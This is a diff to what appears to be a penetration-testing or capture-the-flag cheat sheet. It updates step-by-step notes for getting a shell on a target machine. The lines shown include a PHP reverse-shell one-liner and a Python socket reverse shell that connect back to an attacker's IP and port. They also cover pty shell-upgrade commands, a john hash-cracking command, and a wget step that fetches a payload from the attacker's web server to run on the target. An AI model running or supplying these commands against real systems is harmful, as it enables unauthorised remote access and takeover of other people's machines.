@@ -92,7 +92,7 @@ john id_rsa.hash --wordlist=[../wordlist.txt]
 ```
 php -r '$sock=fsockopen("[Your IP Address]",[Port]);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
-> First, open the php document. (If you search for this php file as php-reverse-shell, you will see many examples.)
+> If we can upload files, open the php document. (If you search for this php file as php-reverse-shell, you will see many examples.)
 ```
 nano ../php-reverse-shell.php
 ```
@@ -116,10 +116,12 @@ print("cozuxhub")
 > To open terminal:
 ```
 python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 > If it doesn't work, do this first:
 ```
 python -c 'import pty; pty.spawn("/bin/sh")'
+python3 -c 'import pty; pty.spawn("/bin/sh")'
 ```
 > Or, create a document.py in the /var/www/html on your machine and type this:
 ```
@@ -128,7 +130,7 @@ python -c 'import pty; pty.spawn("/bin/sh")'
         import os
 
         s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        s.connect(("10.0.2.4",5555))
+        s.connect(("[Your IP Address]",[Port]))
         os.dup2(s.fileno(),0)
         os.dup2(s.fileno(),1)
         os.dup2(s.fileno(),2)
@@ -142,7 +144,7 @@ service apache2 start
 ```
 wget http://[Your IP Address]/[document.py]
 ```
-> Let's run this python file on our target machine.
+> If we can, let's run this python file on our target machine.
 ```
 python document.py
 /usr/bin/python document.py
